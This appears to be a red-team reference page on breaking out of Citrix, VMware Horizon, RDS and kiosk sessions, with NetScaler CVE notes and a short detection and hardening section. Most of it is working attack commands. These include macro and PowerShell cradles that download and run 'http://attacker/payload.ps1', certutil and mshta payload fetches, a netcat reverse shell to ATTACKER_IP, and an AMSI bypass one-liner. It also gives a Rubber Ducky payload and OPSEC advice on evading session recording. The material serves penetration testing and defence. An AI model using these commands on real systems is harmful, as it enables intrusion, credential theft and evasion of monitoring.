# VDI & Kiosk Breakout Techniques

> **MITRE ATT&CK Mapping**: T1059 (Command and Scripting Interpreter), T1218 (System Binary Proxy Execution)
> **Tactic**: Execution, Defense Evasion
> **Platforms**: Citrix Virtual Apps/Desktops, VMware Horizon, Microsoft RDS, Browser-Based Kiosks, Windows Shell Replacement
> **Required Permissions**: Standard user (restricted session), physical access (kiosk scenarios)
> **OPSEC Risk**: Medium (VDI session logging, screen recording, keylogging solutions may be present)

---

## Strategic Overview

Virtual Desktop Infrastructure (VDI) and kiosk environments are designed to restrict users to a
controlled set of applications and prevent access to the underlying operating system. In enterprise
environments, Citrix Virtual Apps, VMware Horizon, and Microsoft Remote Desktop Services deliver
published applications or full desktops to thin clients, with the expectation that users cannot
escape the sandboxed environment. Kiosk deployments -- found in lobbies, retail locations, healthcare
facilities, and public terminals -- further restrict the interface to a single application or
browser window.

For red team operators, breaking out of these restricted environments is a critical skill. A
successful VDI breakout transforms a constrained user session into full operating system access on
the VDI host, which typically resides on the internal corporate network. From there, the attacker
can enumerate the network, harvest credentials, pivot to other systems, and pursue domain
compromise. The techniques involved are often deceptively simple -- exploiting file dialogs, help
menus, print functionality, and accessibility features -- but they require systematic exploration
of every UI element available within the restricted session.

The 2025-2026 threat landscape has seen continued evolution in both VDI deployment patterns and
attack techniques. Citrix NetScaler/ADC vulnerabilities (CVE-2025-5777, CVE-2025-6543,
CVE-2025-7775) provide network-level entry points to VDI infrastructure, while application-level
breakout techniques remain effective against misconfigured deployments. The increasing adoption of
cloud-hosted VDI (Azure Virtual Desktop, Amazon WorkSpaces) introduces new attack surfaces around
identity federation and cloud metadata services. Red team assessments that include VDI breakout
testing consistently reveal that organizations rely too heavily on application restrictions without
implementing defense-in-depth controls.

## Technical Deep-Dive

### 1. Citrix Virtual Apps/Desktops Breakout

#### Published Application Escape Techniques

Citrix published applications present a single application window to the user. The goal is to
escape from this application to gain access to the underlying Windows desktop or command line.

**Systematic exploration methodology:**
1. Identify all menu items, toolbar buttons, and right-click context menus
2. Test every dialog box (Open, Save, Print, Help, About, Preferences)
3. Look for hyperlinks, URL bars, or address fields
4. Test keyboard shortcuts (especially those that invoke OS-level functionality)
5. Examine error messages and crash dialogs for exploitable paths
6. Check clipboard functionality for data transfer capabilities

#### File Dialog Abuse

File dialogs (Open/Save/Browse) are the most common and reliable breakout vector:

```
# Standard file dialog exploitation chain:
# 1. Trigger Open File or Save File dialog (File > Open, File > Save As, Import, etc.)
# 2. Navigate to system directories via the path bar
# 3. Execute system binaries directly from the dialog

# Path bar navigation targets:
C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\explorer.exe
\\attacker-share\tools\payload.exe

# UNC path execution from file dialogs:
# Type in the filename/path field:
\\ATTACKER_IP\share\nc.exe
\\ATTACKER_IP\share\payload.exe

# Environment variable expansion in path bar:
%SYSTEMROOT%\System32\cmd.exe
%COMSPEC%
%WINDIR%\explorer.exe
%APPDATA%\..\Local\Temp\payload.exe
%USERPROFILE%\Desktop

# Right-click context menu in file dialog:
# 1. Right-click in the file listing area
# 2. Select "Open command window here" or "Open PowerShell window here"
# 3. Or "New > Shortcut" to create a shortcut to cmd.exe

# Drag and drop within file dialog:
# Drag a .bat or .exe file into the filename field to execute it
```

**File type filter bypass:**
```
# If the dialog restricts to specific file types (e.g., *.txt, *.docx)
# Method 1: Type *.* or *.exe in the filename field to show all files
# Method 2: Type the full path to cmd.exe directly
# Method 3: Use the file type dropdown to select "All Files (*.*)"
# Method 4: Paste a UNC path that won't be filtered
```

**Shell namespace navigation:**
```
# In the file dialog address bar, type these shell namespace paths:
shell:Desktop
shell:MyComputer
shell:RecycleBinFolder
shell:ControlPanelFolder
shell:NetworkPlacesFolder
shell:PrintersFolder

# These may bypass path restrictions that only filter drive letters
```

#### Help Menu Exploitation

```
# Help viewer (CHM/HTML Help) breakout:
# 1. Open Help menu (F1 or Help > Contents)
# 2. If HTML-based help opens, look for:
#    - Clickable hyperlinks (may open browser)
#    - "Print" option (leads to print dialog)
#    - Right-click > View Source (opens Notepad)
#    - Right-click > Properties (shows URL/path information)
#    - Search functionality (may accept file:// URLs)

# CHM file exploitation:
# If help viewer renders CHM files:
# Right-click > Properties > shows the CHM file path
# Navigate to: mk:@MSITStore:C:\Windows\Help\*.chm
# Some CHM viewers allow execution of embedded scripts

# Help viewer links to external resources:
# Click "Online Help" or "Check for Updates" links
# These may open a browser window (Internet Explorer/Edge)
# From the browser, access file:// URLs to reach the filesystem
# Or use about:blank to get a clean browser instance
```

#### Print Dialog Exploitation

```
# Print dialog exploitation chain:
# 1. File > Print (or Ctrl+P)
# 2. In the printer selection, look for:
#    - "Print to File" option (write files to arbitrary locations)
#    - "Microsoft XPS Document Writer" (Save dialog)
#    - "Microsoft Print to PDF" (Save dialog)
#    - "Fax" printer (may open fax configuration)

# Print to File path:
# 1. Select any printer with "Print to File" option
# 2. Click Print
# 3. In the file save dialog, navigate to C:\Windows\System32\
# 4. Type cmd.exe in the filename field and press Enter
# 5. If cmd.exe opens, you have shell access

# XPS/PDF printer trick:
# 1. Select "Microsoft XPS Document Writer" or "Microsoft Print to PDF"
# 2. Click Print
# 3. Save As dialog appears - use this as a file dialog breakout
# 4. Navigate to system directories and execute binaries

# Printer Properties:
# 1. Click "Properties" or "Preferences" in the print dialog
# 2. Look for "About" tabs with hyperlinks
# 3. Look for "Help" buttons that open HTML help
# 4. Some printer drivers have configuration pages with file browsing
```

#### Hyperlink Abuse

```
# Clickable URLs within applications:
# 1. Find any hyperlink in the application (About dialog, Help, Status bar)
# 2. Click the hyperlink -- it may open the default browser
# 3. From the browser, use the address bar to navigate to:

file:///C:/Windows/System32/cmd.exe
file:///C:/Windows/explorer.exe

# Browser to filesystem:
# 1. In browser address bar: file:///C:/
# 2. Navigate the filesystem visually
# 3. Double-click executable files to launch them

# Creating hyperlinks:
# If the application allows text input with hyperlink support
# (e.g., email, rich text, document creation):
# Insert a hyperlink to: file:///C:/Windows/System32/cmd.exe
# Click the hyperlink to execute
```

#### Citrix StoreFront/Receiver Exploitation

```
# Citrix Receiver/Workspace App settings:
# 1. Right-click Citrix icon in system tray
# 2. Check "Connection Center" for session details
# 3. "Preferences" may reveal local file system paths
# 4. "About" dialog may contain clickable version links

# StoreFront bypass:
# If StoreFront web interface is accessible:
# 1. View page source for configuration details
# 2. Check for API endpoints (/Citrix/Store/resources/v2/)
# 3. Enumerate published applications via API
# 4. Look for applications not visible in the default view

# ICA file analysis:
# Download and inspect .ica files for:
# - Server addresses and ports
# - Application paths
# - Connection parameters
# - Credential information
```

### 2. VMware Horizon Breakout

#### Dialog Abuse Techniques (Parallel to Citrix)

VMware Horizon published applications share similar breakout vectors:

```
# All Citrix file dialog techniques apply to Horizon published apps
# Additional Horizon-specific vectors:

# Horizon Client settings:
# 1. Right-click Horizon Client tray icon
# 2. "Options" > "Connection Server" shows server details
# 3. "USB" settings may reveal connected device information
# 4. "About" may contain clickable links

# Blast/PCoIP protocol considerations:
# - Clipboard redirection may be enabled (data transfer vector)
# - USB redirection may allow HID attacks
# - Drive redirection maps local drives into the session
# - Printer redirection may expose print dialog vectors
```

#### View Agent Exploitation

```
# VMware View Agent runs on the VDI guest OS:
# Default installation path: C:\Program Files\VMware\VMware View\Agent\

# Interesting files:
# - Configuration files with server connection details
# - Log files that may contain session information
# - Certificates for TLS communication

# Service exploitation:
# VMware View Agent services run as SYSTEM
# If local privilege escalation is achieved:
# - Modify agent configuration for persistent access
# - Intercept screen data via agent hooks
# - Harvest credentials from agent memory
```

#### Blast Protocol Abuse

```
# VMware Blast Extreme protocol uses HTML5/WebSocket
# If accessing via browser (HTML Access):
# 1. Browser developer tools (F12) may be accessible
# 2. JavaScript console allows code execution in the browser context
# 3. Browser extensions may provide additional functionality
# 4. Right-click context menus may not be fully disabled

# Blast session token extraction:
# WebSocket connections contain authentication tokens
# Browser dev tools > Network > WS frames > search for auth tokens
# These tokens may be replayable for session hijacking
```

### 3. Application Whitelisting Bypass in VDI

#### Using Allowed Applications as Stepping Stones

```
# If specific applications are whitelisted, use them as launchpads:

# Microsoft Office (if published):
# Word/Excel Macro execution:
Sub AutoOpen()
    Shell "cmd.exe /c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
End Sub

# Excel 4.0 macros (XLM) - may bypass modern macro restrictions:
=EXEC("cmd.exe /c whoami")
=HALT()

# PowerPoint:
# Insert > Object > Package > embed executable
# Insert > Action > Run Program

# Access:
# Modules > VBA code execution
# Autoexec macros run on database open
```

#### LOLBAS (Living Off the Land Binaries) from Restricted Environments

```cmd
# MSBuild (if .NET Framework is installed):
# Create inline task XML file:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

# InstallUtil:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

# RegSvcs / RegAsm:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe payload.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe /U payload.dll

# rundll32:
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("cmd.exe")

# certutil (download and execute):
certutil.exe -urlcache -split -f http://attacker/payload.exe %TEMP%\payload.exe
certutil.exe -decode encoded_payload.txt %TEMP%\payload.exe

# mshta:
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd.exe"", 0:close")
mshta http://attacker/payload.hta

# wmic:
wmic process call create "cmd.exe /c whoami > C:\temp\output.txt"

# forfiles:
forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd.exe /c whoami"

# pcalua (Program Compatibility Assistant):
pcalua.exe -a cmd.exe

# SyncAppvPublishingServer (if App-V is installed):
SyncAppvPublishingServer.exe "n; Start-Process cmd.exe"
```

#### PowerShell Constrained Language Mode Bypass in VDI

```powershell
# Check current language mode
$ExecutionContext.SessionState.LanguageMode
# Expected: ConstrainedLanguage

# Bypass techniques:

# Method 1: PowerShell v2 downgrade (if available)
powershell.exe -version 2 -ep bypass
# PowerShell v2 does not support Constrained Language Mode

# Method 2: Via MSBuild inline task
# Create C# code in XML that executes arbitrary commands
# MSBuild compiles and executes the C# code natively

# Method 3: Via InstallUtil
# Custom .NET assembly with [System.ComponentModel.RunInstaller(true)]
# InstallUtil executes the Uninstall() method which contains payload

# Method 4: Custom runspace (if .NET is accessible)
# Create a PowerShell runspace programmatically in C#
# The new runspace may not inherit CLM restrictions

# Method 5: AMSI bypass (if AMSI is enforcing CLM)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Note: This bypass is frequently updated and may not work on current patches

# Method 6: Script block smuggling via environment variables
$env:payload = "IEX(command)"
powershell -ep bypass -c "& ([scriptblock]::Create($env:payload))"
```

### 4. Kiosk Mode Breakout

#### Browser-Based Kiosk Breakout

```
# F11 Exit:
# Many browser kiosks run in fullscreen (F11)
# Press F11 to toggle fullscreen and reveal browser chrome
# Alt+F4 to close the browser window
# Ctrl+W to close the current tab

# Keyboard shortcuts to escape:
Ctrl+L          # Focus address bar (type file:// URLs)
Ctrl+O          # Open file dialog
Ctrl+S          # Save page dialog (file system access)
Ctrl+P          # Print dialog
Ctrl+J          # Downloads manager
Ctrl+H          # History panel
Ctrl+D          # Bookmark current page (dialog access)
Ctrl+Shift+B    # Bookmark bar toggle
Ctrl+Shift+O    # Bookmark manager (navigate file:// URLs)
Ctrl+Shift+I    # Developer tools (JavaScript console)
Ctrl+Shift+J    # JavaScript console directly
Ctrl+U          # View page source
F12             # Developer tools
Alt+D           # Focus address bar
Alt+Home        # Navigate to home page
Alt+Left/Right  # Navigate back/forward (may reveal non-kiosk pages)

# Right-click exploitation:
# Right-click > "Inspect Element" > Console > execute JavaScript
# Right-click > "View Page Source" > browser navigates to view-source:
# Right-click > "Save As" > file dialog

# URL-based escapes:
about:blank          # Clean page with address bar access
about:config         # Firefox configuration editor
chrome://settings    # Chrome settings page
chrome://flags       # Chrome experimental features
javascript:void(0)   # JavaScript execution in URL bar
data:text/html,<a href="file:///C:/">Click</a>  # Create filesystem link

# Bookmark manager exploitation:
# 1. Ctrl+D to add bookmark
# 2. Change URL to: javascript:void(document.location='file:///C:/')
# 3. Click the bookmark to navigate to filesystem
# Or: Create bookmark with URL: file:///C:/Windows/System32/cmd.exe
```

#### Windows Shell Replacement Breakout

When Windows Explorer is replaced with a custom shell (kiosk application):

```
# Accessibility features (Sticky Keys / Ease of Access):
# Press Shift key 5 times rapidly -> Sticky Keys dialog appears
# The dialog may contain a link to Ease of Access settings
# From settings, navigate to other Control Panel items
# Eventually reach file system access or command prompt

# Sticky Keys sethc.exe replacement (if pre-staged):
# Replace C:\Windows\System32\sethc.exe with cmd.exe
# Then press Shift 5 times for command prompt

# Utility Manager (Windows+U):
# Opens Ease of Access / Accessibility settings
# Narrator > Help > opens browser or help viewer
# Magnifier > opens magnifier with menu bar
# On-Screen Keyboard > may allow input to hidden windows

# Task Manager access:
Ctrl+Alt+Del       # Security options screen
Ctrl+Shift+Esc     # Direct Task Manager access
# From Task Manager: File > Run new task > cmd.exe
# Or: File > Run new task > explorer.exe (full shell)

# Ctrl+Alt+Del options screen:
# "Task Manager" - run new tasks
# "Sign out" - may reveal login screen with accessibility tools
# "Change a password" - may have help links
# "Lock" - lock screen may have accessibility shortcuts

# Run dialog (if not blocked):
Win+R              # Open Run dialog
# Type: cmd.exe, powershell.exe, explorer.exe, mmc.exe

# Other keyboard shortcuts:
Win+E              # Open Explorer
Win+X              # Power user menu (PowerShell, CMD, etc.)
Win+I              # Windows Settings
Win+S              # Windows Search
Ctrl+Esc           # Start menu
Win+Pause          # System properties
Win+Tab            # Task view (switch between desktops/apps)
```

#### Custom Kiosk Application Breakout

```
# Input validation bypass:
# If the kiosk has a text input field:
# - Enter excessively long strings (buffer overflow potential)
# - Enter special characters: |, &, ;, `, $(), %COMSPEC%
# - Enter file paths: C:\Windows\System32\cmd.exe
# - Enter UNC paths: \\attacker\share\payload.exe

# Error dialog exploitation:
# Cause the application to crash or error:
# - Enter unexpected input types
# - Interact rapidly with UI elements
# - Disconnect/reconnect network
# Error dialogs may contain:
# - "Details" button with stack traces and file paths
# - "Help" links that open browser/help viewer
# - "Report" button that opens email client or file dialog
# - "OK" button that reveals the desktop briefly

# Print Screen exploitation:
PrtScn / Print Screen    # Capture screen to clipboard
Win+Shift+S              # Snipping tool
# If Paint or another image editor is accessible:
# 1. Paste screenshot into Paint
# 2. File > Open/Save in Paint provides file dialog access

# Taskbar manipulation:
# If the taskbar is partially visible:
# Right-click taskbar > Task Manager
# Right-click taskbar > Open Windows Explorer
# Right-click clock > Adjust date/time > opens Settings
```

### 5. Thin Client Attacks

#### Clipboard Exploitation Across Sessions

```
# Citrix/Horizon clipboard redirection:
# If clipboard redirection is enabled:
# 1. Copy sensitive data from within the VDI session
# 2. Paste on the local thin client
# 3. Or inject data from local clipboard into VDI session

# Clipboard-based payload delivery:
# On the local machine, copy:
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
# In the VDI session, Ctrl+V into a Run dialog or command prompt

# Clipboard monitoring tool (if running on VDI host):
# Capture all clipboard activity across sessions
# Passwords copied from password managers are exposed
```

#### Drive Mapping (Client Drive Redirection)

```
# Citrix CDM (Client Drive Mapping):
# Local drives may be mapped into the VDI session as:
# \\Client\C$ (or V: drive mapping)
# These mapped drives provide bidirectional file transfer

# Exploitation:
# 1. Place tools/payloads on local drive before connecting
# 2. Access them from within the VDI session via mapped drive
# 3. Exfiltrate data from VDI to local drive

# In Citrix session:
dir \\Client\C$\tools\
copy \\Client\C$\tools\mimikatz.exe C:\Temp\
# Or directly execute:
\\Client\C$\tools\nc.exe -e cmd.exe ATTACKER_IP 4444

# VMware Horizon folder sharing:
# Shared folders appear in the VDI session
# Check: \\tsclient\C (RDP-style mapping)
# Or: Mapped drive letters in Explorer
```

#### USB Redirection Abuse

```
# HID (Human Interface Device) attacks via redirected USB:
# 1. Connect a Rubber Ducky or similar HID device to the thin client
# 2. Configure USB redirection to forward the device to the VDI session
# 3. The HID device types keystrokes in the VDI session context

# Example Rubber Ducky payload for VDI:
DELAY 1000
GUI r
DELAY 500
STRING powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
ENTER

# USB storage redirection:
# If USB mass storage is redirected:
# 1. Mount USB drive with tools in VDI session
# 2. Execute tools directly from USB
# 3. Exfiltrate data to USB drive

# Smart card redirection:
# Smart card readers may be redirected for authentication
# Intercepting smart card communications may reveal credentials
# Or use redirected smart card for lateral movement within VDI
```

#### Printer Redirection Exploitation

```
# Client printers are often redirected into VDI sessions:
# "Print to File" on redirected printers writes to the local machine
# This creates a data exfiltration channel:
# 1. Print sensitive documents to redirected local printer
# 2. Use "Print to File" to write to local filesystem
# 3. Files are now on the local thin client, outside VDI monitoring

# Creating a virtual printer for exfiltration:
# On the local machine, install a "Print to PDF" driver
# Redirect this printer into the VDI session
# Print any document from VDI to local PDF
```

### 6. Registry/GPO Restriction Bypass

#### Alternative Shells When Explorer is Restricted

```cmd
# If explorer.exe is disabled via GPO:

# Command Prompt alternatives:
cmd.exe                          # Standard command prompt
powershell.exe                   # PowerShell
wmic.exe                         # WMI command-line
cscript.exe                      # Windows Script Host (command-line)
wscript.exe                      # Windows Script Host (GUI)

# File manager alternatives:
# Use command-line file management instead of Explorer
dir C:\                          # List directory
copy, move, del, mkdir           # File operations
type filename.txt                # Read files
start notepad.exe filename.txt   # Open files in applications

# Third-party file managers (if present):
# Total Commander, FAR Manager, etc.
# Check: C:\Program Files\ for installed applications
```

#### Bypassing Disabled Right-Click and Run Dialog

```
# If right-click is disabled via GPO:
# NoViewContextMenu = 1

# Alternative access methods:
Shift+F10          # Equivalent to right-click
Application key    # Context menu key on keyboard (between Ctrl and Alt)

# If Run dialog is disabled:
# DisableRun = 1

# Alternative command execution:
# Task Manager > File > Run new task
# File Explorer address bar > type cmd.exe
# Create .bat file and double-click
# PowerShell: Start-Process cmd.exe
# WMI: wmic process call create "cmd.exe"

# If Command Prompt is disabled:
# DisableCMD = 1 (disables cmd.exe and batch files)
# DisableCMD = 2 (disables cmd.exe but allows batch files)

# Alternatives when CMD is disabled:
powershell.exe                              # Usually separate GPO
cscript.exe //nologo script.vbs             # VBScript execution
mshta.exe vbscript:Execute("...")           # HTML Application host
C:\Windows\System32\forfiles.exe /c "cmd /c whoami"  # May bypass DisableCMD
```

#### Environment Variable Manipulation for Path Access

```cmd
# Useful environment variables for navigation:
echo %SYSTEMROOT%          # C:\Windows
echo %SYSTEMDRIVE%         # C:
echo %USERPROFILE%         # C:\Users\username
echo %APPDATA%             # C:\Users\username\AppData\Roaming
echo %LOCALAPPDATA%        # C:\Users\username\AppData\Local
echo %TEMP%                # C:\Users\username\AppData\Local\Temp
echo %PROGRAMFILES%        # C:\Program Files
echo %PROGRAMFILES(X86)%   # C:\Program Files (x86)
echo %COMSPEC%             # C:\Windows\System32\cmd.exe
echo %WINDIR%              # C:\Windows
echo %PUBLIC%              # C:\Users\Public

# In file dialogs, type environment variables directly:
# %TEMP% expands to the temp directory
# %COMSPEC% may execute cmd.exe directly
# %WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe

# PATH manipulation:
# If the user can modify PATH:
set PATH=%PATH%;\\attacker\share
# Now executables on the attacker share can be called by name
```

### 7. NetScaler/ADC CVEs (2025-2026) -- VDI Gateway Attacks

Citrix NetScaler/ADC serves as the gateway to VDI environments. Compromising the gateway provides
access to all sessions and potentially the entire VDI infrastructure:

#### CVE-2025-5777: Citrix Bleed 2 (CVSS 9.3)

```
# Critical vulnerability in NetScaler ADC and NetScaler Gateway
# Added to CISA Known Exploited Vulnerabilities Catalog on July 11, 2025
# Allows unauthenticated attackers to access sensitive information
# Similar to the original Citrix Bleed (CVE-2023-4966)

# Affected versions: NetScaler ADC and Gateway prior to July 2025 patches
# Impact: Session token theft, unauthorized access to VDI sessions
# Exploitation enables:
# - Hijacking active VDI sessions
# - Accessing internal network via VPN gateway
# - Credential theft from session data
```

#### CVE-2025-6543 (CVSS 9.2)

```
# Critical vulnerability in NetScaler ADC and NetScaler Gateway
# Details: Authentication bypass or remote code execution
# Combined with CVE-2025-5777 in security bulletin
# Requires immediate patching per Citrix advisory CTX694788
```

#### CVE-2025-7775: Memory Overflow RCE (August 2025)

```
# Memory overflow vulnerability allowing remote code execution
# and/or denial of service in various NetScaler configurations
# Actively exploited in the wild as confirmed by Rapid7
# Published in Citrix security bulletin alongside:
# - CVE-2025-7776: Memory corruption vulnerability
# - CVE-2025-8424: Improper access control on management interface

# Exploitation enables:
# - Full control of the NetScaler appliance
# - Interception of VDI session traffic
# - Modification of authentication flows
# - Deployment of webshells on the gateway
```

#### CVE-2025-12101 (Late 2025)

```
# Additional NetScaler ADC and Gateway vulnerability
# Disclosed via Citrix support article CTX695486
# Details: Affects NetScaler ADC and Gateway configurations
# Patching required for all deployments
```

#### Large-Scale Scanning Campaign (January-February 2026)

Between January 28 and February 2, 2026, security researchers detected over 111,834 scanning
sessions from 63,000+ unique IP addresses specifically targeting Citrix NetScaler login panels and
gateway infrastructure. This indicates active threat actor reconnaissance for unpatched instances.

## 2025 Techniques

### Certified Kiosk Breakout Professional (CKBPro) Framework

The CKBPro certification (released 2025) formalized kiosk breakout methodology into a structured
framework. The exam requires candidates to break out of a locked Windows kiosk environment using
only permitted UI features, dialog boxes, and local misconfigurations, then perform further attacks
such as privilege escalation and lateral movement.

### VDI Breakout Research Paper (2024-2025)

Published academic research "Breaking Out of VDI Restrictions" (ResearchGate, 2024) documented
systematic approaches to VDI escape across Citrix, VMware, and Microsoft platforms, including
novel techniques for bypassing application whitelisting in virtual desktop environments.

### NetScaler Critical Vulnerability Chain (2025)

The combination of CVE-2025-5777 (CVSS 9.3), CVE-2025-6543 (CVSS 9.2), and CVE-2025-7775
(in-the-wild exploitation) created a critical threat to all Citrix-based VDI deployments in 2025.
These vulnerabilities affect the gateway layer, meaning that even well-configured VDI sessions
behind the gateway are compromised when the gateway itself falls.

### Cloud-Hosted VDI Attack Surfaces (2025)

The shift to Azure Virtual Desktop and Amazon WorkSpaces introduced new breakout vectors:
```
# Azure Virtual Desktop:
# - Azure Instance Metadata Service: http://169.254.169.254/metadata/instance
# - Managed Identity token theft for Azure resource access
# - Azure AD token extraction from session

# Amazon WorkSpaces:
# - EC2 Instance Metadata: http://169.254.169.254/latest/meta-data/
# - IAM role credential theft
# - VPC network access from breakout position
```

### Thin Client Firmware Exploitation (2025)

Research into IGEL, HP, and Dell thin client firmware revealed:
- Default credentials on management interfaces
- Firmware update mechanism tampering
- USB boot bypass for OS replacement
- Network-based configuration injection via management protocols

## Detection & Defense

### Detection Strategies

```powershell
# Monitor for breakout indicators on VDI hosts:

# Process creation monitoring (Sysmon Event ID 1):
# Alert on unexpected process trees:
# published_app.exe -> cmd.exe
# published_app.exe -> powershell.exe
# published_app.exe -> mshta.exe
# published_app.exe -> rundll32.exe
# published_app.exe -> certutil.exe
# published_app.exe -> msbuild.exe

# File dialog monitoring:
# Monitor for file access outside allowed application directories
# Alert on access to C:\Windows\System32\cmd.exe from file dialogs
# Monitor for UNC path access from VDI sessions

# Citrix Director / VMware Horizon Console:
# Monitor session activity for anomalies
# Track application launch patterns per user
# Alert on processes not in the published application list

# Network monitoring from VDI segments:
# VDI hosts should only communicate with:
# - Domain controllers (Kerberos, LDAP)
# - File servers (SMB)
# - Application servers
# Alert on: Port scans, lateral movement, C2 beaconing
```

### Hardening Recommendations

**Citrix hardening:**
```
# 1. AppLocker / WDAC (Windows Defender Application Control)
#    Define strict application whitelists
#    Block all executables not explicitly allowed
#    Include DLL rules and script rules

# 2. Disable file dialogs where possible
#    Configure applications to hide Open/Save dialogs
#    Use Citrix policies to restrict file access

# 3. Citrix policies:
#    - Disable clipboard redirection (or set to one-directional)
#    - Disable client drive mapping
#    - Disable USB redirection
#    - Disable printer redirection (or restrict to specific printers)
#    - Enable session recording for high-privilege sessions

# 4. Remove unnecessary binaries:
#    - Remove or restrict access to cmd.exe, powershell.exe
#    - Remove or rename mshta.exe, certutil.exe, msbuild.exe
#    - Use Software Restriction Policies as defense-in-depth

# 5. Disable accessibility features:
#    - Disable Sticky Keys shortcut (registry)
#    - Disable Narrator, Magnifier, On-Screen Keyboard
#    - Disable Utility Manager shortcut

# 6. Apply NetScaler patches immediately:
#    - CVE-2025-5777, CVE-2025-6543, CVE-2025-7775, CVE-2025-12101
#    - Enable WAF features on NetScaler
#    - Monitor for scanning campaigns targeting login panels
```

**Kiosk hardening:**
```
# 1. Use Windows Assigned Access / Kiosk Mode properly
#    - Configure via Intune or Group Policy
#    - Use a dedicated kiosk user account with minimal permissions

# 2. Disable all keyboard shortcuts:
#    - Use Group Policy to disable Ctrl+Alt+Del options
#    - Disable Windows key shortcuts
#    - Disable Alt+Tab, Alt+F4
#    - Use third-party kiosk lockdown software

# 3. Browser kiosk mode:
#    - Use dedicated kiosk browser (not standard Chrome/Firefox)
#    - Disable developer tools
#    - Disable right-click context menu
#    - Restrict URL navigation to whitelist
#    - Disable file:// protocol handler
#    - Disable about: pages

# 4. Physical security:
#    - Disable USB ports (physically or via BIOS)
#    - Lock BIOS with password
#    - Disable boot from USB/network
#    - Secure physical access to keyboard/mouse ports
```

## OPSEC Considerations

- **Session recording**: Many VDI deployments record sessions (Citrix Session Recording, ObserveIT,
  Cyberark PSM). Assume all screen activity is captured and reviewed.
- **Keystroke logging**: Some VDI solutions include keystroke logging. Avoid typing sensitive
  commands directly; use clipboard or automated tools.
- **Process monitoring**: VDI hosts typically run EDR agents that monitor process creation. Use
  living-off-the-land techniques rather than dropping tools to disk.
- **Network segmentation**: VDI networks may be heavily monitored. Unusual network traffic from
  VDI hosts (port scans, C2 beaconing) is more visible than from workstations.
- **Breakout detection speed**: File dialog access, unexpected process creation, and command prompt
  access on VDI hosts generate alerts in well-monitored environments. Work quickly after breakout
  and establish persistence before detection.
- **Thin client logs**: Thin client devices may log connection details, USB events, and user
  activity. These logs are often overlooked but can be forensically valuable.
- **Gateway logs**: NetScaler/ADC logs all session activity including authentication attempts,
  session duration, and client details. Gateway exploitation leaves significant forensic evidence.
- **Multi-session awareness**: In multi-session VDI environments (e.g., Citrix Virtual Apps with
  shared desktops), other users' sessions may be running on the same host. Activity that affects
  system stability impacts all sessions and increases detection risk.
- **Clipboard monitoring**: Some organizations deploy clipboard monitoring/DLP solutions that
  inspect clipboard content for sensitive data patterns. Exfiltrating credentials via clipboard
  may trigger DLP alerts.

## Cross-References

- [Execution Techniques Overview](../03-execution/)
- [Defense Evasion -- Application Whitelisting Bypass](../06-defense-evasion/)
- [Privilege Escalation from VDI Breakout](../05-privilege-escalation/)
- [Lateral Movement from VDI Host](../09-lateral-movement/)
- [Credential Access in VDI Environments](../07-credential-access/)
- [Initial Access via Citrix NetScaler CVEs](../02-initial-access/)
- [Cloud Security -- Azure Virtual Desktop](../13-cloud-security/)

## References

- Cognosec: Breaking Out of Citrix Environment -- https://cognosec.com/breaking-out-of-citrix-environment/
- NetSPI: Breaking Out of Applications Deployed via Terminal Services, Citrix, and Kiosks -- https://blog.netspi.com/breaking-out-of-applications-deployed-via-terminal-services-citrix-and-kiosks/
- Pen Test Partners: Breaking Out of Citrix and Other Restricted Desktop Environments -- https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/
- stmxcsr: Windows Breakout Techniques -- https://stmxcsr.com/micro/windows-breakout.html
- InfoSec Write-ups: Escaping the Citrix Sandbox -- https://infosecwriteups.com/escaping-the-citrix-sandbox-understanding-citrix-breakout-80320a3d44af
- ResearchGate: Breaking Out of VDI Restrictions (2024) -- https://www.researchgate.net/publication/377931251_Breaking_Out_of_VDI_Restrictions
- Tarlogic: VDI Security - Pentesting in Restricted Environments -- https://www.tarlogic.com/blog/pentests-in-restricted-vdi-environments/
- SilentGrid: Restricted Environment Breakout -- https://www.silentgrid.com/penetration-testing/restricted-environment-breakout
- TrustedSec: Kiosk/POS Breakout Keys in Windows -- https://www.trustedsec.com/blog/kioskpos-breakout-keys-in-windows
- ikarus23: Kiosk Mode Breakout Tips & Tricks -- https://github.com/ikarus23/kiosk-mode-breakout
- SecQuest: Introduction to Kiosk Breakout -- https://www.secquest.co.uk/white-papers/introduction-to-kiosk-breakout
- InternalAllTheThings: Kiosk Escape and Jail Breakout -- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/escape-breakout/
- Payatu: How to Prevent Hacking Out of Kiosk -- https://payatu.com/blog/how-to-prevent-hacking-out-of-kiosk/
- Viral Maniar: ATM/Kiosk Machine Hacking Shortcuts -- https://viralmaniar.github.io/atm%20hacking/kiosk%20hacking/shortcuts/
- Boschko: ATM/Kiosk Hacking Real World Examples -- https://boschko.ca/atm-kiosk-hacking-labs/
- Twingate: Sticky Keys Exploit -- https://www.twingate.com/blog/glossary/sticky%20keys%20exploit
- Rapid7: CVE-2025-7775 Critical NetScaler Vulnerability Exploited In-The-Wild -- https://www.rapid7.com/blog/post/etr-cve-2025-7775-critical-netscaler-vulnerability-exploited-in-the-wild/
- VulnCheck: New Citrix NetScaler Zero-Day Exploited in the Wild -- https://www.vulncheck.com/blog/new-citrix-netscaler-zero-day-vulnerability-exploited-in-the-wild
- NetScaler: Critical Security Updates for CVE-2025-6543 and CVE-2025-5777 -- https://www.netscaler.com/blog/news/netscaler-critical-security-updates-for-cve-2025-6543-and-cve-2025-5777/
